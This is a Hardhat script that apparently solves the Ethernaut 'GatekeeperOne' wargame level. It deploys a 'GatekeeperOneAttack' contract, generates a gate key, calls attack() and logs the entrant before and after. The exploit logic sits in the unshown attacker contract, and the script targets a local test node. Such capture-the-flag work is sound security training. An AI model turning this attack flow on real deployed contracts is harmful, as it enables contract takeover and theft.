import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x06cd7788D77332cF1156f1E327eBC090B5FF16a3";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("GatekeeperOne",CONTRACT_ADDRESS,signer);

const attackerContractFactory = await ethers.getContractFactory("GatekeeperOneAttack", signer);
const attackerContract = await attackerContractFactory.deploy(contract.address);

//HACK STEPS

// 1. Check entrant state variable 
let entrant = await contract.entrant();
console.log("The entrant is now: ", entrant);

// 2. Generate the key to hack contract
console.log("Key is not initialized, lets check it first!", await attackerContract.readKey());
await attackerContract.makeKey();
console.log("This key will hack the gates!", await attackerContract.readKey());

// 3. Call attacker contract function 
await attackerContract.attack();

// 4. Check entrant state variable again
entrant = await contract.entrant();
console.log("My player address is: ", PLAYER_ADDRESS, "and the entrant is now: ", entrant);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
